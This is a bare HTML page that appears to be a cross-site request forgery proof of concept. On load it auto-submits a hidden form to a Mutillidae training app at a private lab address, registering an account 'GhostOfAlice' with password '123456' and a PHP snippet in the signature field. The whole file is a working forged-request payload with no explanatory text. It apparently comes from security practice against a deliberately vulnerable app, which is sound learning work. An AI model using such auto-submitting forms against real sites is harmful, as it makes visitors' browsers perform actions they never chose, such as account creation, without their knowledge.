<html>
<head>
</head>
<body onload="document.getElementById('registerForm').submit()">
<form id="registerForm" action="http://192.168.10.130/mutillidae/index.php?page=register.php" method="post">
<input name="csrf-token" value="" type="hidden"/>
<input HTMLandXSSandSQLInjectionPoint="1" type="text" name="username" size="15" autofocus="1" value="GhostOfAlice">
<input SQLInjectionPoint="1" type="hidden" name="password" size="15" value="123456">
<input SQLInjectionPoint="1" type="hidden" name="confirm_password" size="15" value="123456">
<textarea HTMLandXSSandSQLInjectionPoint="1" rows="3" cols="50" name="my_signature"><?php echo "SIGNATURE"; ?></textarea>
<input name="register-php-submit-button" class="button" type="hidden" value="Create Account">
</form>
</body>
</html>